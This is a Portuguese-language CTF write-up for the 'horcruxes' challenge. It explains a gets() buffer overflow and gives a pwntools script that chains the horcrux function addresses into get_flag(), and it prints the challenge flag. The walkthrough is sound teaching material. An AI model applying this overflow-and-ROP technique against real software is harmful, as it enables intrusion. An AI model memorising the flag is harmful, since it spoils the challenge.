# horcruxes

###### Solved by @beatriz-a-cardozo, @CupNudous

Este é um CTF sobre pwn, análise de código em C/C++, ROP e Buffer Overflow.

## About the Challenge

O  programa simula um sistema baseado na história de Harry Potter, onde o jogador precisa derrotar Voldemort. Para isso, o sistema pergunta quantos pontos de experiência (XP) foram ganhos. Caso todas as horcruxes não tenham sido coletadas, o jogador não terá XP suficiente para derrotá-lo e falhará na missão. No entanto, ao recuperar todas as horcruxes, o programa soma seus valores e, ao atingir a quantia correta, permite a vitória e exibe a flag.

A vulnerabilidade no código permite a manipulação desse fluxo, forçando a execução de todas as funções horcrux para garantir a "vitória".

A desmontagem do binário com objdump ou gdb revela os endereços das funções horcrux:

>$ objdump -d horcruxes | grep -E "horcrux_"

Isso retornará uma lista de endereços das funções responsáveis por armazenar os valores das horcruxes. Outra abordagem é utilizar o GDB:

>$ gdb ./horcruxes

>(gdb) disas main

Ao analisar o código desmontado, é possível identificar as chamadas para cada função horcrux e anotar seus endereços (mostrados mais abaixo). Dessa forma, esses endereços poderão ser usados na construção da ROP chain.

Cada função retorna um número fixo e, ao chamar todas elas, é possível obter a soma correta para chamar get_flag().

## Solution

A vulnerabilidade está na função gets(), que permite um buffer overflow para sobrescrever o endereço de retorno da função. Isso pode ser explorado para criar uma ROP chain que chama todas as funções horcrux e, em seguida, get_flag().

O payload será composto por:

>Um preenchimento (padding) até alcançar o endereço de retorno

>Endereços das funções horcrux, garantindo que cada uma seja chamada

>Chamando get_flag() com o valor correto no registrador eax

O exploit em Python utilizando pwntools:

```

from pwn import *

p = process("./horcruxes")

padding = b"A" * 40  # Preenchendo até o endereço de retorno
rop_chain = [
    p32(0x0809fe4b),  # Endereço de horcrux1
    p32(0x0809fe6a),  # Endereço de horcrux2
    p32(0x0809fe89),  # Endereço de horcrux3
    p32(0x0809fea8),  # Endereço de horcrux4
    p32(0x0809fec7),  # Endereço de horcrux5
    p32(0x0809fee6),  # Endereço de horcrux6
    p32(0x0809ff05),  # Endereço de horcrux7
    p32(0x0809fffc)   # Endereço de get_flag()
]

payload = padding + b"".join(rop_chain)
p.sendline(payload)
p.interactive()
```

Rodando o código, a flag será revelada após o processo de "derrotar" Voldemort.

[![1-vq-OY8-Swdfl-Phi24-Ot-U-ZBg.webp](https://i.postimg.cc/7Zhkcnv4/1-vq-OY8-Swdfl-Phi24-Ot-U-ZBg.webp)](https://postimg.cc/ykMt39Yp)

> `Magic_spell_1s_4vad4_K3daVr4`